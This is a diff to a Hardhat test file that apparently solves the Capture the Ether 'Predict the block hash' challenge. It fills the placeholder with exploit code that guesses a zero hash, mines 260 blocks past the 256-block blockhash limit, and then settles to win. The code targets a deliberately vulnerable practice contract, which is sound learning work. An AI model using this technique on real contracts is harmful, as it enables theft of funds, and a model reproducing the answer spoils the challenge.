@@ -24,9 +24,16 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    
+    await target.lockInGuess(ethers.constants.HashZero, { value: utils.parseEther('1') });
+    
+    // Mine enough blocks (more than 256) so that blockhash(settlementBlockNumber) returns 0.
+    // Here, we mine 260 blocks to be safe.
+    for (let i = 0; i < 260; i++) {
+      await ethers.provider.send("evm_mine", []);
+    }
+        
+    await target.settle(); 
 
     expect(await target.isComplete()).to.equal(true);
   });
